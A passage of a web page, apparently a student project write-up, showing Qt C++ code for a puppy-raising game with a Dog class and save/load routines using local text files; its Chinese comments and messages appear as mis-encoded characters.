class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dog.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;family.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QInputDialog&gt;</span></span><br><br><br>Dog::<span class="hljs-built_in">Dog</span>()<br>&#123;<br>    ill=<span class="hljs-number">0</span>;<br>    ability=<span class="hljs-number">0</span>;<br>    energy=<span class="hljs-number">10</span>;<br>    state=<span class="hljs-number">0</span>;<br>    worktime=<span class="hljs-number">0</span>;<br>&#125;<br><br>Dog::~<span class="hljs-built_in">Dog</span>() &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::DogGrow</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(ill==<span class="hljs-number">1</span>||energy&lt;=<span class="hljs-number">0.0</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">//å¦‚æœå°ç‹—ç”Ÿç—…äº†ï¼Œå°±ç›´æ¥é€€å›ä¸ä¼šå‘ç”Ÿç»å†çš„çš„æ¶ˆè€—</span><br><br>    <span class="hljs-keyword">if</span>(state==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(energy<span class="hljs-number">-1</span>&lt;=<span class="hljs-number">0.0</span>)<br>        &#123;<br>            energy=<span class="hljs-number">0.0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            energy--;  <span class="hljs-comment">//æ—¥å¸¸æ´»åŠ¨é»˜è®¤ç²¾åŠ›å‡ä¸€</span><br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        state=<span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogName</span><span class="hljs-params">(QString Dogname)</span></span><br><span class="hljs-function"></span>&#123;<br>    name=Dogname;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy=Dogenergy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span></span><br><span class="hljs-function"></span>&#123;<br>    ability=Dogability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::resetDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=<span class="hljs-number">0</span>;<br>    ill=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span></span><br><span class="hljs-function"></span>&#123;<br>    ill=DogIll;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span></span><br><span class="hljs-function"></span>&#123;<br>    state=Dogstate;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=Worktime;<br>&#125;<br><br><span class="hljs-function">QString <span class="hljs-title">Dog::getDogName</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">Dog::getDogEnergy</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> energy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogAbility</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ill;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogState</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogWorktime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> worktime;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::judgeDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(energy==<span class="hljs-number">0.0</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(worktime==<span class="hljs-number">5</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::doHousework</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;åšå®¶åŠ¡&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¸®å¿™å®¶åŠ¡ä¸€å°æ—¶ï¼Œå¿«å¤¸å¤¸å°ç‹—ï¼\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;åšå®¶åŠ¡&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¾ˆç´¯ï¼Œå¿«ä¸ºå°ç‹—è¡¥å……ä½“åŠ›å§ï¼\n&quot;</span>);<br>    &#125;<br>&#125;<br><br>BigDog::<span class="hljs-built_in">BigDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += (food / <span class="hljs-number">2.0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy -= (<span class="hljs-number">1</span> / <span class="hljs-number">2.0</span>);<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å°†å‡ºé—¨æ‰“å·¥ä¸€å°æ—¶ï¼Œè®°å¾—å¥–åŠ±å°ç‹—å“¦ï¼\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¾ˆç´¯ï¼Œå¿«ä¸ºå°ç‹—è¡¥å……ä½“åŠ›å§ï¼\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;ç»éªŒä¸è¶³è¢«è€æ¿åŠé€€äº†ï¼Œå»åšå®¶åŠ¡å¢åŠ ç»éªŒå§ï¼\n&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br>SmallDog::<span class="hljs-built_in">SmallDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += food;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    QString message=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å°†å‡ºé—¨æ‰“å·¥ä¸€å°æ—¶ï¼Œè®°å¾—å¥–åŠ±å°ç‹—å“¦ï¼\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¾ˆç´¯ï¼Œå¿«ä¸ºå°ç‹—è¡¥å……ä½“åŠ›å§ï¼\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;ç»éªŒä¸è¶³è¢«è€æ¿åŠé€€äº†ï¼Œå»åšå®¶åŠ¡å¢åŠ ç»éªŒå§ï¼\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-2-éƒ¨åˆ†åŠŸèƒ½ä»‹ç»"><a href="#5-2-éƒ¨åˆ†åŠŸèƒ½ä»‹ç»" class="headerlink" title="5.2 éƒ¨åˆ†åŠŸèƒ½ä»‹ç»"></a>5.2 éƒ¨åˆ†åŠŸèƒ½ä»‹ç»</h4><h5 id="è¯»æ¡£å­˜æ¡£"><a href="#è¯»æ¡£å­˜æ¡£" class="headerlink" title="è¯»æ¡£å­˜æ¡£"></a>è¯»æ¡£å­˜æ¡£</h5><p>åˆ©ç”¨TXTæ–‡ä»¶çš„è¯»å†™å®ç°å­˜æ¡£åŠŸèƒ½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-comment">//-------------------------è¯»æ¡£å­˜æ¡£ç•Œé¢-----------------------------</span><br><span class="hljs-comment">//åˆå§‹è½½å…¥å­˜æ¡£åç§°</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::InitialRecord</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);    <span class="hljs-comment">//save1æ˜¯å›¾å½¢åŒ–ç•Œé¢ä¸­ç»„ä»¶çš„åå­—ï¼Œä¸‹åŒ</span><br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//é‡ç½®å­˜æ¡£</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ResetRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;.../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fwrite</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fwrite.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);  <span class="hljs-comment">//å¯¹å­˜æ¡£æ–‡ä»¶è¿›è¡Œåªå†™æ“ä½œå†™å…¥ç©ºå­˜æ¡£æ ‡å¿— !@#$%^</span><br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fwrite)</span></span>;<br>        QString s=<span class="hljs-string">&quot;!@#$%^&quot;</span>;<br>        ds &lt;&lt; <span class="hljs-built_in">QString</span>(s);<br>    &#125;<br><br>    pSave-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>    pRead-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br><br>    Fwrite.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//è¯»æ¡£</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ReadRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æç¤º&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;ç¡®å®šé€‰æ‹©è¯¥å­˜æ¡£?&lt;/h3&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span 